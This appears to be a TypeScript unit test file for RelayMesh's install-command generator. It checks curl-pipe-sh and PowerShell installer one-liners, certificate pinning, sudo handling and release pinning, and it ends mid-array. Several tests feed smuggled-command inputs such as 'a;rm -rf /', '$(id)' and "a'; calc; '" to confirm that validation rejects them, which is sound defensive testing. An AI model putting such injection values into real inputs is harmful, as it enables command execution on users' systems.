// 运行：pnpm --dir frontend run test:unit
import assert from 'node:assert/strict'
import { execFileSync } from 'node:child_process'
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join, resolve } from 'node:path'
import { describe, it } from 'node:test'
import {
  CERT_SUMMARY,
  INSTALLER_PS_URL,
  INSTALLER_URL,
  MAX_SSH_ALLOW,
  PS_CERT_PIN_SOURCE,
  SUDO_IF_NEEDED,
  buildInstallCommand,
  buildServerUrl,
  chooseSource,
  githubInstallerUrl,
  hubScriptUrl,
  inferDefault,
  inferDefaultTarget,
  isLoopbackHost,
  isValidAutoWindow,
  normalizeHost,
  parseSshAllow,
  validReleaseTag,
  type HubSource,
  type InstallInput,
  type InstallSourceStatus,
} from './installCommand'

const PIN = 'sha256:' + 'ab'.repeat(32)
const TICKET = '0123456789abcdef0123456789abcdef'
const SPKI = 'sha256//' + 'A'.repeat(43) + '='
const HUB: HubSource = { ticket: TICKET, spki: SPKI }

function input(over: Partial<InstallInput> = {}): InstallInput {
  return { os: 'linux', mode: 'service', scope: 'system', cert: 'pinned', host: '192.168.1.10', port: 18776, pin: PIN, ...over }
}

describe('normalizeHost', () => {
  it('接受主机名、IPv4 与 IPv6（统一加方括号）', () => {
    assert.equal(normalizeHost('relay.example.com'), 'relay.example.com')
    assert.equal(normalizeHost(' 10.0.0.5 '), '10.0.0.5')
    assert.equal(normalizeHost('::1'), '[::1]')
    assert.equal(normalizeHost('[fe80::1]'), '[fe80::1]')
  })

  it('拒绝空值、带协议 / 路径 / 端口 / shell 元字符的输入', () => {
    for (const bad of ['', '  ', 'http://a.com', 'a.com/x', 'a.com:8080x', 'a b', 'a;rm -rf /', '$(id)', 'a`id`', 'a.com\nb', '-bad', 'bad-', "a'b", 'fe80::1%eth0']) {
      assert.equal(normalizeHost(bad), null, JSON.stringify(bad))
    }
  })
})

describe('isLoopbackHost', () => {
  it('识别回环与通配地址', () => {
    for (const h of ['localhost', '127.0.0.1', '127.1.2.3', '[::1]', '::1', '0.0.0.0', 'app.localhost']) assert.equal(isLoopbackHost(h), true, h)
    for (const h of ['192.168.1.2', 'example.com', 'localhost.example.com']) assert.equal(isLoopbackHost(h), false, h)
  })
})

describe('buildInstallCommand', () => {
  it('Linux 系统级常驻安装：按需 sudo + install + pin', () => {
    const r = buildInstallCommand(input())
    assert.deepEqual(r.errors, [])
    assert.equal(r.serverUrl, 'https://192.168.1.10:18776')
    assert.equal(r.command, `curl -fsSL ${INSTALLER_URL} | ${SUDO_IF_NEEDED} sh -s -- agent install --server https://192.168.1.10:18776 --pin ${PIN}`)
  })

  it('系统级命令不再写死 sudo：root（包括没有 sudo 的容器 / 云主机）与普通用户用同一条命令', () => {
    const r = buildInstallCommand(input())
    assert.equal(/\|\s*sudo\s/.test(r.command), false, '管道后不能直接是 sudo')
    assert.ok(r.command.includes(SUDO_IF_NEEDED))
  })

  it('用户级安装不使用 sudo 并带 --user', () => {
    const r = buildInstallCommand(input({ scope: 'user', cert: 'trusted', host: 'relay.example.com', port: null, pin: '' }))
    assert.equal(r.command, `curl -fsSL ${INSTALLER_URL} | sh -s -- agent install --user --server https://relay.example.com`)
    assert.equal(r.command.includes('sudo'), false)
    assert.equal(r.command.includes('--pin'), false)
  })

  it('Linux 仅当前用户会自动开启 linger，并如实告知；系统级与 macOS 不涉及', () => {
    const linuxUser = buildInstallCommand(input({ scope: 'user', cert: 'trusted', host: 'relay.example.com', port: null, pin: '' }))
    assert.ok(linuxUser.warnings.some(w => w.includes('enable-linger')))
    assert.equal(buildInstallCommand(input()).warnings.some(w => w.includes('linger')), false)
    assert.equal(buildInstallCommand(input({ os: 'macos', scope: 'user' })).warnings.some(w => w.includes('linger')), false)
    // 临时运行没有常驻服务，不会碰 linger
    assert.equal(buildInstallCommand(input({ mode: 'temporary' })).warnings.some(w => w.includes('linger')), false)
  })

  it('macOS 使用同一安装脚本', () => {
    const r = buildInstallCommand(input({ os: 'macos' }))
    assert.ok(r.command.includes('agent install'))
  })

  it('临时运行：前台 run --temp，并提示机器码会变化', () => {
    const r = buildInstallCommand(input({ mode: 'temporary' }))
    assert.ok(r.command.includes('agent run --temp'))
    assert.ok(r.warnings.some(w => w.includes('机器码')))
  })

  it('明文模式：http 地址 + --insecure + 风险提示', () => {
    const r = buildInstallCommand(input({ cert: 'insecure', port: 18775, pin: '' }))
    assert.equal(r.serverUrl, 'http://192.168.1.10:18775')
    assert.ok(r.command.endsWith('--insecure'))
    assert.ok(r.warnings.some(w => w.includes('明文')))
  })

  it('IPv6 主机带方括号', () => {
    const r = buildInstallCommand(input({ host: 'fd00::5' }))
    assert.equal(r.serverUrl, 'https://[fd00::5]:18776')
  })

  it('回环地址给出警告但仍生成命令', () => {
    const r = buildInstallCommand(input({ host: 'localhost' }))
    assert.deepEqual(r.errors, [])
    assert.ok(r.warnings.some(w => w.includes('回环')))
    assert.ok(r.command.length > 0)
  })

  it('Windows 临时运行：PowerShell 脚本块形式，值用单引号包裹', () => {
    const r = buildInstallCommand(input({ os: 'windows', mode: 'temporary' }))
    assert.deepEqual(r.errors, [])
    assert.equal(
      r.command,
      `& ([scriptblock]::Create((irm '${INSTALLER_PS_URL}').TrimStart([char]0xFEFF))) agent run --temp --server 'https://192.168.1.10:18776' --pin '${PIN}'`,
    )
    assert.ok(r.warnings.some(w => w.includes('机器码')))
    assert.ok(r.warnings.some(w => w.includes('UAC') && w.includes('--no-elevate')), '应提示会弹出 UAC 以及跳过方式')
  })

  it('Windows 常驻安装：用户级带 --user 且无需管理员；系统级提示管理员与 SYSTEM 风险', () => {
    const user = buildInstallCommand(input({ os: 'windows', mode: 'service', scope: 'user' }))
    assert.deepEqual(user.errors, [])
    assert.ok(user.command.includes(' agent install --user --server '))
    assert.ok(user.warnings.some(w => w.includes('不需要管理员')))

    const sys = buildInstallCommand(input({ os: 'windows', mode: 'service', scope: 'system' }))
    assert.deepEqual(sys.errors, [])
    assert.ok(sys.command.includes(' agent install --server '))
    assert.equal(sys.command.includes('--user'), false)
    assert.ok(sys.warnings.some(w => w.includes('以管理员身份运行') && w.includes('SYSTEM')))
  })

  it('Windows 第三档「当前用户 + 最高权限」：带 --user --highest，并提示用管理员 PowerShell 执行', () => {
    const r = buildInstallCommand(input({ os: 'windows', mode: 'service', scope: 'user-admin' }))
    assert.deepEqual(r.errors, [])
    assert.ok(r.command.includes(' agent install --user --highest --server '), r.command)
    assert.ok(r.warnings.some(w => w.includes('以管理员身份运行') && w.includes('UAC')), '应说明需要管理员 PowerShell 且不弹 UAC')
    // 另外两档的命令不能被它影响
    const user = buildInstallCommand(input({ os: 'windows', mode: 'service', scope: 'user' }))
    assert.equal(user.command.includes('--highest'), false)
    const sys = buildInstallCommand(input({ os: 'windows', mode: 'service', scope: 'system' }))
    assert.equal(sys.command.includes('--highest'), false)
  })

  it('「当前用户 + 最高权限」只适用于 Windows：其他系统给出错误而不是生成一条会被拒绝的命令', () => {
    for (const os of ['linux', 'macos'] as const) {
      const r = buildInstallCommand(input({ os, mode: 'service', scope: 'user-admin' }))
      assert.equal(r.command, '', os)
      assert.ok(r.errors.some(e => e.includes('Windows')), os)
    }
  })

  it('临时运行不受安装范围影响（即使残留了 user-admin 也不带 --highest）', () => {
    const r = buildInstallCommand(input({ os: 'windows', mode: 'temporary', scope: 'user-admin' }))
    assert.deepEqual(r.errors, [])
    assert.equal(r.command.includes('--highest'), false)
    assert.ok(r.command.includes(' agent run --temp '))
  })

  it('Windows 各种证书模式：受信任证书不带 --pin，明文带 --insecure 且地址为 http', () => {
    const trusted = buildInstallCommand(input({ os: 'windows', mode: 'temporary', cert: 'trusted', host: 'relay.example.com', port: null, pin: '' }))
    assert.ok(trusted.command.endsWith("--server 'https://relay.example.com'"))
    assert.equal(trusted.command.includes('--pin'), false)
    const plain = buildInstallCommand(input({ os: 'windows', mode: 'temporary', cert: 'insecure', port: 18775, pin: '' }))
    assert.ok(plain.command.endsWith("--server 'http://192.168.1.10:18775' --insecure"))
  })

  it('Windows 命令里的每个可变值都来自白名单：IPv6 带方括号也被单引号包住，不含单引号以外的元字符', () => {
    const r = buildInstallCommand(input({ os: 'windows', mode: 'temporary', host: 'fd00::5' }))
    assert.ok(r.command.includes("--server 'https://[fd00::5]:18776'"))
    const afterScript = r.command.slice(r.command.indexOf(') agent ') + 1)
    assert.doesNotMatch(afterScript, /[;&`$(){}<>"\\\n|]/)
    // 注入尝试被校验拦下，不会产生命令
    for (const host of ["a'; calc; '", 'a$(calc)', 'a`calc`', 'a b']) {
      assert.equal(buildInstallCommand(input({ os: 'windows', host })).command, '', host)
    }
  })

  it('非法输入不会产生命令：主机、端口、指纹', () => {
    assert.equal(buildInstallCommand(input({ host: 'a;b' })).command, '')
    assert.equal(buildInstallCommand(input({ port: 0 })).command, '')
    assert.equal(buildInstallCommand(input({ port: 70000 })).command, '')
    assert.equal(buildInstallCommand(input({ port: 1.5 })).command, '')
    assert.equal(buildInstallCommand(input({ pin: 'sha256:xyz' })).command, '')
    assert.equal(buildInstallCommand(input({ pin: '' })).command, '')
  })

  it('生成的命令里不含任何 shell 元字符（除管道本身与那段固定的 sudo 判断）', () => {
    const r = buildInstallCommand(input({ host: 'relay-01.example.com' }))
    // 固定文本整体拿掉之后，剩下的（全部来自可变值）不得含任何元字符：这样才能证明注入面没有因为这段固定文本而变大。
    const afterPipe = r.command.slice(r.command.indexOf('|') + 1).replace(SUDO_IF_NEEDED, '')
    assert.doesNotMatch(afterPipe, /[;&`$(){}<>"'\\\n|]/)
    // 固定文本本身不依赖任何输入
    for (const host of ['a.example.com', '10.0.0.1']) {
      assert.ok(buildInstallCommand(input({ host })).command.includes(SUDO_IF_NEEDED))
    }
  })
})

describe('SUDO_IF_NEEDED 在真实的 sh 里的行为', { skip: process.platform === 'win32' ? '需要 POSIX sh' : false }, () => {
  // 用桩 id / sudo 构造三种环境，PATH 只含桩目录：既不依赖本机是不是 root，也不依赖本机装没装 sudo。
  function run(opts: { uid: string; withSudo: boolean }): string {
    const dir = mkdtempSync(join(tmpdir(), 'rm-sudo-'))
    try {
      writeFileSync(join(dir, 'id'), `#!/bin/sh\necho ${opts.uid}\n`, { mode: 0o755 })
      if (opts.withSudo) writeFileSync(join(dir, 'sudo'), '#!/bin/sh\nexit 0\n', { mode: 0o755 })
      return execFileSync('/bin/sh', ['-c', `printf '[%s]' ${SUDO_IF_NEEDED}`], { env: { PATH: dir }, encoding: 'utf8' })
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  }

  it('root：什么都不加（哪怕装了 sudo）', () => {
    assert.equal(run({ uid: '0', withSudo: false }), '[]')
    assert.equal(run({ uid: '0', withSudo: true }), '[]')
  })

  it('普通用户且有 sudo：加 sudo', () => {
    assert.equal(run({ uid: '1000', withSudo: true }), '[sudo]')
  })

  it('普通用户且没有 sudo：什么都不加，让安装脚本去说明需要 root（而不是 sudo: command not found）', () => {
    assert.equal(run({ uid: '1000', withSudo: false }), '[]')
  })

  it('完整的管道：root 直接交给 sh，普通用户经由 sudo 交给 sh', () => {
    const r = buildInstallCommand(input({ cert: 'trusted', host: 'relay.example.com', port: null, pin: '' }))
    // 取管道之后的部分，前面的 curl 换成 echo：只验证「谁来执行 sh」，不真的联网
    const pipeline = `echo script ${r.command.slice(r.command.indexOf('|'))}`
    const exec = (uid: string, withSudo: boolean): string => {
      const dir = mkdtempSync(join(tmpdir(), 'rm-sudo-'))
      try {
        writeFileSync(join(dir, 'id'), `#!/bin/sh\necho ${uid}\n`, { mode: 0o755 })
        writeFileSync(join(dir, 'sh'), '#!/bin/sh\nprintf "sh:%s\\n" "$*"\n', { mode: 0o755 })
        if (withSudo) writeFileSync(join(dir, 'sudo'), '#!/bin/sh\nprintf "sudo:%s\\n" "$*"\n', { mode: 0o755 })
        return execFileSync('/bin/sh', ['-c', pipeline], { env: { PATH: dir }, encoding: 'utf8' }).trim()
      } finally {
        rmSync(dir, { recursive: true, force: true })
      }
    }
    const args = '-s -- agent install --server https://relay.example.com'
    assert.equal(exec('0', false), `sh:${args}`, 'root 且没有 sudo：就是 `sh -s -- …`，不报 sudo: command not found')
    assert.equal(exec('0', true), `sh:${args}`)
    assert.equal(exec('1000', true), `sudo:sh ${args}`)
  })
})

describe('buildServerUrl', () => {
  it('省略端口时不带冒号', () => {
    assert.equal(buildServerUrl('trusted', 'a.com', null), 'https://a.com')
    assert.equal(buildServerUrl('insecure', 'a.com', 80), 'http://a.com:80')
  })
})

describe('inferDefaultTarget', () => {
  it('通过内置 HTTPS 端口访问：指纹校验', () => {
    const t = inferDefaultTarget({ protocol: 'https:', hostname: '10.0.0.2', port: '18776' }, 18776, PIN)
    assert.deepEqual(t, { host: '10.0.0.2', port: 18776, cert: 'pinned' })
  })

  it('通过域名 https 访问：受信任证书，沿用页面端口', () => {
    assert.deepEqual(inferDefaultTarget({ protocol: 'https:', hostname: 'relay.example.com', port: '' }, 18776, PIN), { host: 'relay.example.com', port: null, cert: 'trusted' })
    assert.deepEqual(inferDefaultTarget({ protocol: 'https:', hostname: 'relay.example.com', port: '8443' }, 18776, PIN), { host: 'relay.example.com', port: 8443, cert: 'trusted' })
  })

  it('http 访问：有内置 HTTPS 就推荐指纹校验，否则退回明文', () => {
    assert.deepEqual(inferDefaultTarget({ protocol: 'http:', hostname: '10.0.0.2', port: '18775' }, 18776, PIN), { host: '10.0.0.2', port: 18776, cert: 'pinned' })
    assert.deepEqual(inferDefaultTarget({ protocol: 'http:', hostname: '10.0.0.2', port: '18775' }, null, ''), { host: '10.0.0.2', port: 18775, cert: 'insecure' })
  })
})

describe('服务端自带安装源（hub）', () => {
  const hub = (over: Partial<InstallInput> = {}) => input({ hub: HUB, ...over })

  it('GitHub 来源与改动前完全一致（没有 hub 时）', () => {
    const r = buildInstallCommand(input())
    assert.equal(r.source, 'github')
    assert.ok(r.command.includes(INSTALLER_URL))
    assert.equal(r.command.includes('/i/'), false)
  })

  it('Linux 受信任证书：直接从服务端取脚本，不带任何证书开关', () => {
    const r = buildInstallCommand(hub({ cert: 'trusted', host: 'relay.example.com', port: null, pin: '' }))
    assert.deepEqual(r.errors, [])
    assert.equal(r.source, 'hub')
    assert.equal(r.command, `curl -fsSL https://relay.example.com/i/${TICKET}/install.sh | ${SUDO_IF_NEEDED} sh -s -- agent install --server https://relay.example.com`)
  })

  it('Linux 内置 HTTPS：-k 只跳过信任链，--pinnedpubkey 逐字校验公钥，Agent 再带 --pin', () => {
    const r = buildInstallCommand(hub())
    assert.deepEqual(r.errors, [])
    assert.equal(
      r.command,
      `curl -fsSL -k --pinnedpubkey '${SPKI}' https://192.168.1.10:18776/i/${TICKET}/install.sh | ${SUDO_IF_NEEDED} sh -s -- agent install --server https://192.168.1.10:18776 --pin ${PIN}`,
    )
  })

  it('-k 只和 --pinnedpubkey 一起出现：受信任证书与明文的取脚本命令里没有 -k，不会静默放弃校验', () => {
    for (const cert of ['trusted', 'insecure'] as const) {
      const r = buildInstallCommand(hub({ cert, port: cert === 'insecure' ? 18775 : null, pin: '' }))
      const fetch = r.command.split('|')[0]
      assert.equal(/\s-k\s/.test(fetch), false, cert)
      assert.equal(fetch.includes('--pinnedpubkey'), false, cert)
    }
    const pinned = buildInstallCommand(hub()).command.split('|')[0]
    assert.ok(/\s-k\s/.test(pinned) && pinned.includes('--pinnedpubkey'))
  })

  it('明文 HTTP：http 地址 + --insecure（要求显式选择）', () => {
    const r = buildInstallCommand(hub({ cert: 'insecure', port: 18775, pin: '' }))
    assert.equal(r.command, `curl -fsSL http://192.168.1.10:18775/i/${TICKET}/install.sh | ${SUDO_IF_NEEDED} sh -s -- agent install --server http://192.168.1.10:18775 --insecure`)
    assert.ok(r.warnings.some(w => w.includes('明文')))
  })

  it('临时运行与用户级安装沿用同样的取脚本方式', () => {
    const temp = buildInstallCommand(hub({ mode: 'temporary' }))
    assert.ok(temp.command.includes(`/i/${TICKET}/install.sh | sh -s -- agent run --temp --server `))
    const user = buildInstallCommand(hub({ scope: 'user' }))
    assert.ok(user.command.includes(`/i/${TICKET}/install.sh | sh -s -- agent install --user --server `))
    assert.equal(user.command.includes('sudo'), false)
  })

  it('macOS 与 Linux 取同一份 install.sh', () => {
    const r = buildInstallCommand(hub({ os: 'macos' }))
    assert.ok(r.command.includes(`/i/${TICKET}/install.sh`))
  })

  it('IPv6 地址在 shell 里必须加引号（方括号是通配符）', () => {
    const r = buildInstallCommand(hub({ host: 'fd00::5' }))
    assert.ok(r.command.includes(`'https://[fd00::5]:18776/i/${TICKET}/install.sh'`))
    assert.ok(r.command.includes(`--server 'https://[fd00::5]:18776'`))
  })

  it('Windows 受信任证书：irm 取服务端的 install.ps1', () => {
    const r = buildInstallCommand(hub({ os: 'windows', cert: 'trusted', host: 'relay.example.com', port: null, pin: '' }))
    assert.deepEqual(r.errors, [])
    assert.equal(
      r.command,
      `& ([scriptblock]::Create((irm 'https://relay.example.com/i/${TICKET}/install.ps1').TrimStart([char]0xFEFF))) agent install --server 'https://relay.example.com'`,
    )
  })

  it('Windows 明文：http 地址 + --insecure', () => {
    const r = buildInstallCommand(hub({ os: 'windows', mode: 'temporary', cert: 'insecure', port: 18775, pin: '' }))
    assert.equal(
      r.command,
      `& ([scriptblock]::Create((irm 'http://192.168.1.10:18775/i/${TICKET}/install.ps1').TrimStart([char]0xFEFF))) agent run --temp --server 'http://192.168.1.10:18775' --insecure`,
    )
  })

  it('Windows 内置 HTTPS：取脚本这一步也按证书指纹校验，且失败时不会执行任何内容', () => {
    const r = buildInstallCommand(hub({ os: 'windows', mode: 'temporary' }))
    assert.deepEqual(r.errors, [])
    const c = r.command
    assert.equal(/[\r\n]/.test(c), false, '必须是单行，粘贴到 PowerShell 才不会被拆开')
    assert.ok(c.startsWith('& { $s = $null; '), '先清空 $s，避免读到父作用域里同名变量')
    assert.ok(c.includes(`Add-Type -TypeDefinition '${PS_CERT_PIN_SOURCE}'`))
    assert.ok(c.includes(`[RelayMeshCertPin]::Expected = '${'ab'.repeat(32)}'`))
    assert.ok(c.includes('ServerCertificateValidationCallback = [RelayMeshCertPin]::Callback'))
    assert.ok(c.includes(`DownloadData('https://192.168.1.10:18776/i/${TICKET}/install.ps1')`))
    assert.ok(c.includes('finally { [Net.ServicePointManager]::ServerCertificateValidationCallback = $prev }'), '回调必须在 finally 里恢复')
    assert.ok(
      c.indexOf('= [RelayMeshCertPin]::Callback') < c.indexOf('DownloadData(') && c.indexOf('DownloadData(') < c.indexOf('= $prev }'),
      '先注册回调，再下载，最后恢复',
    )
    assert.ok(c.includes('if (-not $s) { return }'))
    assert.ok(c.endsWith(`agent run --temp --server 'https://192.168.1.10:18776' --pin '${PIN}' }`))
    // 绝不允许用「接受任意证书」的捷径
    assert.doesNotMatch(c, /SkipCertificateCheck|return \$true|\{\s*\$true\s*\}/)
  })

  it('Windows 内置 HTTPS 不需要公钥指纹（用证书指纹），Linux 缺它则拒绝生成命令', () => {
    const noSpki: HubSource = { ticket: TICKET, spki: '' }
    assert.deepEqual(buildInstallCommand(input({ hub: noSpki, os: 'windows' })).errors, [])
    const linux = buildInstallCommand(input({ hub: noSpki }))
    assert.equal(linux.command, '')
    assert.ok(linux.errors.some(e => e.includes('公钥指纹')))
    // 受信任证书与明文也不需要它
    assert.deepEqual(buildInstallCommand(input({ hub: noSpki, cert: 'trusted', pin: '' })).errors, [])
  })

  it('票据与公钥指纹都按白名单校验：任何注入尝试都不会产生命令', () => {
    const bad = ["a'; rm -rf /; '", TICKET.toUpperCase(), TICKET + '0', TICKET.slice(1), '', '$(id)', '`id`', TICKET.replace('0', '"')]
    for (const ticket of bad) {
      for (const os of ['linux', 'windows'] as const) {
        const r = buildInstallCommand(input({ os, hub: { ticket, spki: SPKI } }))
        assert.equal(r.command, '', JSON.stringify(ticket))
        assert.ok(r.errors.some(e => e.includes('安装票据')), JSON.stringify(ticket))
      }
    }
    for (const spki of ["sha256//A'; id; '", 'sha256//' + 'A'.repeat(43), 'sha256//' + 'A'.repeat(44) + '=', 'md5//abc', '']) {
      assert.equal(buildInstallCommand(input({ hub: { ticket: TICKET, spki } })).command, '', JSON.stringify(spki))
    }
  })

  it('hubScriptUrl 按目标系统选脚本', () => {
    assert.equal(hubScriptUrl('https://a.com', TICKET, 'linux'), `https://a.com/i/${TICKET}/install.sh`)
    assert.equal(hubScriptUrl('https://a.com', TICKET, 'macos'), `https://a.com/i/${TICKET}/install.sh`)
    assert.equal(hubScriptUrl('https://a.com', TICKET, 'windows'), `https://a.com/i/${TICKET}/install.ps1`)
  })

  it('命令里的类型源码必须与 install.ps1 里的 Enable-CertPin 一致', () => {
    let ps = ''
    try {
      ps = readFileSync(resolve(process.cwd(), '../internal/installer/assets/install.ps1'), 'utf8')
    } catch {
      return // 只在完整仓库里检查
    }
    const m = ps.match(/Add-Type -TypeDefinition @'\r?\n([\s\S]*?)\r?\n'@/)
    assert.ok(m, 'install.ps1 里应当有 Add-Type -TypeDefinition @\'…\'@')
    assert.equal(m![1].replace(/\r?\n/g, ''), PS_CERT_PIN_SOURCE, '两处的回调类型源码出现了分歧')
    assert.doesNotMatch(PS_CERT_PIN_SOURCE, /'/, '源码要放进 PowerShell 单引号字符串，不能含单引号')
    assert.doesNotMatch(PS_CERT_PIN_SOURCE, /ServicePointManager/, 'C# 里不能引用 ServicePointManager：PowerShell 7.6 会报编译错误 SYSLIB0014')
  })
})

describe('chooseSource', () => {
  const full: InstallSourceStatus = {
    available: true,
    ticket: TICKET,
    spki_pin: SPKI,
    platforms: ['linux-amd64', 'linux-arm64', 'darwin-amd64', 'darwin-arm64', 'windows-amd64'],
  }

  it('服务端没有附带 Agent：退回 GitHub 并说明原因', () => {
    for (const st of [undefined, null, { available: false }]) {
      const c = chooseSource('linux', st, true)
      assert.equal(c.kind, 'github')
      assert.ok(c.kind === 'github' && c.note.includes('GitHub'))
    }
  })

  it('附带齐全且窗口开启：用服务端来源，并带上票据与公钥指纹', () => {
    const c = chooseSource('windows', full, true)
    assert.deepEqual(c, { kind: 'hub', hub: { ticket: TICKET, spki: SPKI } })
  })

  it('窗口没开（即便缓存里还有旧票据）：等待，不生成命令', () => {
    assert.deepEqual(chooseSource('linux', full, false), { kind: 'waiting', reason: 'window-closed' })
  })

  it('窗口刚开、票据还没取回：等待', () => {
    assert.deepEqual(chooseSource('linux', { ...full, ticket: undefined }, true), { kind: 'waiting', reason: 'ticket-pending' })
  })

  it('缺少该系统的某个架构：整体退回 GitHub，不生成半截能用的命令', () => {
    const partial = { ...full, platforms: ['linux-amd64', 'windows-amd64'] }
    const linux = chooseSource('linux', partial, true)
    assert.equal(linux.kind, 'github')
    assert.ok(linux.kind === 'github' && linux.note.includes('linux-arm64'))
    assert.equal(chooseSource('macos', partial, true).kind, 'github')
    assert.equal(chooseSource('windows', partial, true).kind, 'hub')
  })

  it('平台列表缺失按「没有」处理', () => {
    assert.equal(chooseSource('linux', { available: true, ticket: TICKET }, true).kind, 'github')
  })

  it('选出来的来源可以直接喂给命令生成器', () => {
    const c = chooseSource('linux', full, true)
    assert.equal(c.kind, 'hub')
    if (c.kind !== 'hub') return
    const r = buildInstallCommand(input({ hub: c.hub }))
    assert.deepEqual(r.errors, [])
    assert.equal(r.source, 'hub')
  })

  // ---- 追加 #736 / #738：回退到 GitHub 时带上服务端自己的 Release 标签 ----
  const TAG = 'v2.0.0-rc.3'

  it('没有安装源但知道版本：固定到同一个 Release，说明里写明版本', () => {
    for (const st of [{ available: false, version: TAG }, { version: TAG, available: false, platforms: [] }]) {
      const c = chooseSource('linux', st, true)
      assert.equal(c.kind, 'github')
      if (c.kind !== 'github') return
      assert.equal(c.release, TAG)
      assert.ok(c.note.includes(TAG) && c.note.includes('同一个版本'), c.note)
      assert.ok(!c.note.includes('开发版'), c.note)
    }
  })

  it('缺少该系统的某个架构但知道版本：同样固定到同一个 Release', () => {
    const c = chooseSource('linux', { ...full, platforms: ['linux-amd64'], version: TAG }, true)
    assert.equal(c.kind, 'github')
    if (c.kind !== 'github') return
    assert.equal(c.release, TAG)
    assert.ok(c.note.includes('linux-arm64') && c.note.includes(TAG), c.note)
  })

  it('开发版 / 版本未知 / 不合法的版本：release 为 null，说明里写明只能取 main 与最新正式版', () => {
    for (const version of [undefined, '', 'dev', 'v1.6.3-dev-20261020-15e4726', 'main', "v2.0.0'; id; '", 'v2.0']) {
      const c = chooseSource('linux', { available: false, version }, true)
      assert.equal(c.kind, 'github', String(version))
      if (c.kind !== 'github') return
      assert.equal(c.release, null, String(version))
      assert.ok(c.note.includes('开发版或版本未知') && c.note.includes('最新正式版'), c.note)
    }
    const none = chooseSource('linux', null, true)
    assert.ok(none.kind === 'github' && none.release === null)
  })

  it('服务端有齐全的安装源时，version 不影响选择（仍用服务端来源）', () => {
    assert.deepEqual(chooseSource('windows', { ...full, version: TAG }, true), { kind: 'hub', hub: { ticket: TICKET, spki: SPKI } })
  })

  it('选出来的 GitHub 来源可以直接喂给命令生成器：命令固定在同一个 Release 上', () => {
    const c = chooseSource('linux', { available: false, version: TAG }, true)
    assert.equal(c.kind, 'github')
    if (c.kind !== 'github') return
    const r = buildInstallCommand(input({ release: c.release }))
    assert.deepEqual(r.errors, [])
    assert.equal(r.source, 'github')
    assert.ok(r.command.includes(`/RelayMesh/${TAG}/install.sh`) && r.command.includes(`RELAYMESH_VERSION=${TAG}`), r.command)
  })
})

// 没有安装源的 Hub（单二进制、go run）回退到 GitHub 来源：脚本地址与 RELAYMESH_VERSION 必须固定到服务端同一个 Release，
// 否则脚本取 main 上 1.x 的版本（不认识 agent 子命令），或取「最新正式版」（预览期间没有 Agent 资产），命令都会失败。
// 实机验证：rc.2 单二进制 Hub + 标签脚本 + RELAYMESH_VERSION 可以下载、校验并连上；只换标签不带版本会 404（见 D-348）。
describe('GitHub 来源固定到 Release', () => {
  const TAG = 'v2.0.0-rc.3'
  const RAW = 'https://raw.githubusercontent.com/teacat99/RelayMesh'

  it('Linux 系统级：脚本取标签上的那一份，env 放在 sudo 之后、sh 之前带 RELAYMESH_VERSION', () => {
    const r = buildInstallCommand(input({ release: TAG }))
    assert.deepEqual(r.errors, [])
    assert.equal(r.source, 'github')
    assert.equal(
      r.command,
      `curl -fsSL ${RAW}/${TAG}/install.sh | ${SUDO_IF_NEEDED} env RELAYMESH_VERSION=${TAG} sh -s -- agent install --server https://192.168.1.10:18776 --pin ${PIN}`,
    )
    assert.ok(!r.warnings.some(w => w.includes('开发版或版本未知')), '固定到 Release 后不应再提示版本未知')
  })

  it('仅当前用户、临时运行、macOS：同样固定，env 只作用于 sh 这一条命令', () => {
    const user = buildInstallCommand(input({ scope: 'user', release: TAG, cert: 'trusted', host: 'relay.example.com', port: null }))
    assert.equal(user.command, `curl -fsSL ${RAW}/${TAG}/install.sh | env RELAYMESH_VERSION=${TAG} sh -s -- agent install --user --server https://relay.example.com`)
    const temp = buildInstallCommand(input({ mode: 'temporary', release: TAG }))
    assert.equal(temp.command, `curl -fsSL ${RAW}/${TAG}/install.sh | env RELAYMESH_VERSION=${TAG} sh -s -- agent run --temp --server https://192.168.1.10:18776 --pin ${PIN}`)
    const mac = buildInstallCommand(input({ os: 'macos', release: TAG }))
    assert.ok(mac.command.startsWith(`curl -fsSL ${RAW}/${TAG}/install.sh | `) && mac.command.includes(`env RELAYMESH_VERSION=${TAG} sh -s -- agent install `), mac.command)
  })

  it('明文 / 受信任证书也一样固定', () => {
    const insecure = buildInstallCommand(input({ cert: 'insecure', port: 18775, release: TAG }))
    assert.equal(insecure.command, `curl -fsSL ${RAW}/${TAG}/install.sh | ${SUDO_IF_NEEDED} env RELAYMESH_VERSION=${TAG} sh -s -- agent install --server http://192.168.1.10:18775 --insecure`)
    const trusted = buildInstallCommand(input({ cert: 'trusted', host: 'relay.example.com', port: null, release: TAG }))
    assert.equal(trusted.command, `curl -fsSL ${RAW}/${TAG}/install.sh | ${SUDO_IF_NEEDED} env RELAYMESH_VERSION=${TAG} sh -s -- agent install --server https://relay.example.com`)
  })

  it('Windows：先设 $env:RELAYMESH_VERSION，再取标签上的 install.ps1', () => {
    const r = buildInstallCommand(input({ os: 'windows', mode: 'temporary', release: TAG }))
    assert.deepEqual(r.errors, [])
    assert.equal(
      r.command,
      `$env:RELAYMESH_VERSION='${TAG}'; & ([scriptblock]::Create((irm '${RAW}/${TAG}/install.ps1').TrimStart([char]0xFEFF))) agent run --temp --server 'https://192.168.1.10:18776' --pin '${PIN}'`,
    )
    const sys = buildInstallCommand(input({ os: 'windows', release: TAG }))
    assert.ok(sys.command.startsWith(`$env:RELAYMESH_VERSION='${TAG}'; & ([scriptblock]::Create((irm '${RAW}/${TAG}/install.ps1')`), sys.command)
    assert.ok(sys.command.endsWith(`agent install --server 'https://192.168.1.10:18776' --pin '${PIN}'`), sys.command)
  })

  it('没有版本（开发版 / 未知）：取 main 与最新正式版，不带 RELAYMESH_VERSION，并明说命令在 2.0 正式版前会失败', () => {
    for (const release of [undefined, null, '', 'dev']) {
      const lx = buildInstallCommand(input({ release }))
      assert.equal(lx.command, `curl -fsSL ${INSTALLER_URL} | ${SUDO_IF_NEEDED} sh -s -- agent install --server https://192.168.1.10:18776 --pin ${PIN}`, String(release))
      const win = buildInstallCommand(input({ os: 'windows', release }))
      assert.ok(win.command.startsWith(`& ([scriptblock]::Create((irm '${INSTALLER_PS_URL}')`), win.command)
      for (const r of [lx, win]) {
        assert.ok(!r.command.includes('RELAYMESH_VERSION'), r.command)
        assert.ok(r.warnings.some(w => w.includes('开发版或版本未知') && w.includes('命令会失败')), r.warnings.join('\n'))
      }
    }
  })

  it('标签不合法就当没有：想往命令里塞内容的写法一个也进不了命令', () => {
    const bad = [
